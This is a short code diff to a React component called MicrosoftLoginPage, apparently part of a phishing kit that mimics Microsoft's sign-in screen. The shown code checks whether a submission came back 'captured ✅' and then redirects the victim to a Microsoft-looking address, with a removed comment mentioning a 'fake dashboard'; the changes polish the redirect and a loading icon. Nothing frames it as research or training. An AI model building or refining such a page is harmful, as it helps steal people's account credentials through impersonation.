@@ -94,8 +94,8 @@ export default function MicrosoftLoginPage() {
       const result = await res.json()
       
       if (result.status === 'captured ✅') {
-        // Redirect to fake dashboard 
-        window.location.href = '/login.microsoft.com'
+        
+      window.location.href = '/https://login.microsoft.com'
       } else {
         setError('Something went wrong. Please try again.')
       }
@@ -300,7 +300,7 @@ export default function MicrosoftLoginPage() {
             >
               {isLoading ? (
                 <>
-                  <span style={{ marginRight: '8px' }}>🔄</span>
+                  <span style={{ marginRight: '8px' }}></span>
                   {step === 'email' ? 'Checking...' : 'Signing in...'}
                 </>
               ) : step === 'email' ? 'Next' : 'Sign in'}
